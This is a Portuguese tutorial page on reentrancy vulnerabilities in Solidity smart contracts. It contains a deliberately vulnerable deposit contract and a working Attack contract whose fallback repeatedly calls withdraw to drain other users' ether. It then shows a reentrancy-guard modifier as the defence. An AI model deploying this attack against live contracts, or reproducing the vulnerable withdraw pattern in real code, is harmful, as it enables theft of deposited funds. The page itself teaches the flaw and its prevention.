# Reentrada

</h4><a href="#vulnerability" id="vulnerability">Vulnerabilidade</a></h4>

Vamos dizer que o contrato`A` chama o contrato `B`.

A exploração de reentrada permite `B` chamar de volta `A` antes que `A` termine a execução.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
EtherStore é um contrato onde você pode depositar e retirar ETH.
Esse contrato é vulnerável a ataque de reentrada.
Vamos ver por quê.

1. Implemente EtherStore
2. Deposite 1 Ether cada da Conta 1 (Alice) e Conta 2 (Bob) na EtherStore
3. Implemente Attack com endereço da EtherStore
4. Chama Attack.attack enviando 1 ether (usando a Conta 3 (Eve)).
   Você obterá 3 Ethers de volta (2 Ether roubados de Alice e Bob,
   mais 1 Ether enviado desse contrato).

O que aconteceu?
Attack foi capaz de chamar EtherStore.withdraw múltiplas vezes antes que
EtherStore.withdraw terminasse de executar.

Aqui está como as funções foram chamadas
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Função Helper para verificar o saldo desse contrato
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback é chamada quando EtherStore envia Ether para esse contrato.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Função Helper para checar o balanço nesse contrato
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

</h4><a href="#preventative-techniques" id="preventative-techniques">Técnicas preventivas</a></h4>

- Certifique-se de que todas as mudanças de estado acontecem antes de chamar os contratos externos
- Use modificadores de função que impedem a reentrada

Aqui está um exemplo de proteção contra reentrada

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}
```

## Teste no Remix

-[ReEntrancy.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xMzsKCi8qCkV0aGVyU3RvcmUgZSB1bSBjb250cmF0byBvbmRlIHZvY2UgcG9kZSBkZXBvc2l0YXIgZSByZXRpcmFyIEVUSC4KRXNzZSBjb250cmF0byBlIHZ1bG5lcmF2ZWwgYSBhdGFxdWUgZGUgcmVlbnRyYWRhLgpWYW1vcyB2ZXIgcG9yIHF1ZS4KCjEuIEltcGxlbWVudGUgRXRoZXJTdG9yZQoyLiBEZXBvc2l0ZSAxIEV0aGVyIGNhZGEgZGEgQ29udGEgMSAoQWxpY2UpIGUgQ29udGEgMiAoQm9iKSBuYSBFdGhlclN0b3JlCjMuIEltcGxlbWVudGUgQXR0YWNrIGNvbSBlbmRlcmVjbyBkYSBFdGhlclN0b3JlCjQuIENoYW1hIEF0dGFjay5hdHRhY2sgZW52aWFuZG8gMSBldGhlciAodXNhbmRvIGEgQ29udGEgMyAoRXZlKSkuCiAgIFZvY2Ugb2J0ZXJhIDMgRXRoZXJzIGRlIHZvbHRhICgyIEV0aGVyIHJvdWJhZG9zIGRlIEFsaWNlIGUgQm9iLAogICBtYWlzIDEgRXRoZXIgZW52aWFkbyBkZXNzZSBjb250cmF0bykuCgpPIHF1ZSBhY29udGVjZXU/CkF0dGFjayBmb2kgY2FwYXogZGUgY2hhbWFyIEV0aGVyU3RvcmUud2l0aGRyYXcgbXVsdGlwbGFzIHZlemVzIGFudGVzIHF1ZQpFdGhlclN0b3JlLndpdGhkcmF3IHRlcm1pbmFzc2UgZGUgZXhlY3V0YXIuCgpBcXVpIGVzdGEgY29tbyBhcyBmdW5jb2VzIGZvcmFtIGNoYW1hZGFzCi0gQXR0YWNrLmF0dGFjawotIEV0aGVyU3RvcmUuZGVwb3NpdAotIEV0aGVyU3RvcmUud2l0aGRyYXcKLSBBdHRhY2sgZmFsbGJhY2sgKHJlY2VpdmVzIDEgRXRoZXIpCi0gRXRoZXJTdG9yZS53aXRoZHJhdwotIEF0dGFjay5mYWxsYmFjayAocmVjZWl2ZXMgMSBFdGhlcikKLSBFdGhlclN0b3JlLndpdGhkcmF3Ci0gQXR0YWNrIGZhbGxiYWNrIChyZWNlaXZlcyAxIEV0aGVyKQoqLwoKY29udHJhY3QgRXRoZXJTdG9yZSB7CiAgICBtYXBwaW5nKGFkZHJlc3MgPT4gdWludCkgcHVibGljIGJhbGFuY2VzOwoKICAgIGZ1bmN0aW9uIGRlcG9zaXQoKSBwdWJsaWMgcGF5YWJsZSB7CiAgICAgICAgYmFsYW5jZXNbbXNnLnNlbmRlcl0gKz0gbXNnLnZhbHVlOwogICAgfQoKICAgIGZ1bmN0aW9uIHdpdGhkcmF3KCkgcHVibGljIHsKICAgICAgICB1aW50IGJhbCA9IGJhbGFuY2VzW21zZy5zZW5kZXJdOwogICAgICAgIHJlcXVpcmUoYmFsID4gMCk7CgogICAgICAgIChib29sIHNlbnQsICkgPSBtc2cuc2VuZGVyLmNhbGx7dmFsdWU6IGJhbH0oIiIpOwogICAgICAgIHJlcXVpcmUoc2VudCwgIkZhaWxlZCB0byBzZW5kIEV0aGVyIik7CgogICAgICAgIGJhbGFuY2VzW21zZy5zZW5kZXJdID0gMDsKICAgIH0KCiAgICAvLyBGdW5jYW8gSGVscGVyIHBhcmEgdmVyaWZpY2FyIG8gc2FsZG8gZGVzc2UgY29udHJhdG8KICAgIGZ1bmN0aW9uIGdldEJhbGFuY2UoKSBwdWJsaWMgdmlldyByZXR1cm5zICh1aW50KSB7CiAgICAgICAgcmV0dXJuIGFkZHJlc3ModGhpcykuYmFsYW5jZTsKICAgIH0KfQoKY29udHJhY3QgQXR0YWNrIHsKICAgIEV0aGVyU3RvcmUgcHVibGljIGV0aGVyU3RvcmU7CgogICAgY29uc3RydWN0b3IoYWRkcmVzcyBfZXRoZXJTdG9yZUFkZHJlc3MpIHsKICAgICAgICBldGhlclN0b3JlID0gRXRoZXJTdG9yZShfZXRoZXJTdG9yZUFkZHJlc3MpOwogICAgfQoKICAgIC8vIEZhbGxiYWNrIGUgY2hhbWFkYSBxdWFuZG8gRXRoZXJTdG9yZSBlbnZpYSBFdGhlciBwYXJhIGVzc2UgY29udHJhdG8uCiAgICBmYWxsYmFjaygpIGV4dGVybmFsIHBheWFibGUgewogICAgICAgIGlmIChhZGRyZXNzKGV0aGVyU3RvcmUpLmJhbGFuY2UgPj0gMSBldGhlcikgewogICAgICAgICAgICBldGhlclN0b3JlLndpdGhkcmF3KCk7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGF0dGFjaygpIGV4dGVybmFsIHBheWFibGUgewogICAgICAgIHJlcXVpcmUobXNnLnZhbHVlID49IDEgZXRoZXIpOwogICAgICAgIGV0aGVyU3RvcmUuZGVwb3NpdHt2YWx1ZTogMSBldGhlcn0oKTsKICAgICAgICBldGhlclN0b3JlLndpdGhkcmF3KCk7CiAgICB9CgogICAgLy8gRnVuY2FvIEhlbHBlciBwYXJhIGNoZWNhciBvIGJhbGFuY28gbmVzc2UgY29udHJhdG8KICAgIGZ1bmN0aW9uIGdldEJhbGFuY2UoKSBwdWJsaWMgdmlldyByZXR1cm5zICh1aW50KSB7CiAgICAgICAgcmV0dXJuIGFkZHJlc3ModGhpcykuYmFsYW5jZTsKICAgIH0KfQ==&version=soljson-v0.8.13+commit.abaa5c0e.js)

- [ReEntrancyGuard.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xMzsKCmNvbnRyYWN0IFJlRW50cmFuY3lHdWFyZCB7CiAgICBib29sIGludGVybmFsIGxvY2tlZDsKCiAgICBtb2RpZmllciBub1JlZW50cmFudCgpIHsKICAgICAgICByZXF1aXJlKCFsb2NrZWQsICJObyByZS1lbnRyYW5jeSIpOwogICAgICAgIGxvY2tlZCA9IHRydWU7CiAgICAgICAgXzsKICAgICAgICBsb2NrZWQgPSBmYWxzZTsKICAgIH0KfQ==&version=soljson-v0.8.13+commit.abaa5c0e.js)
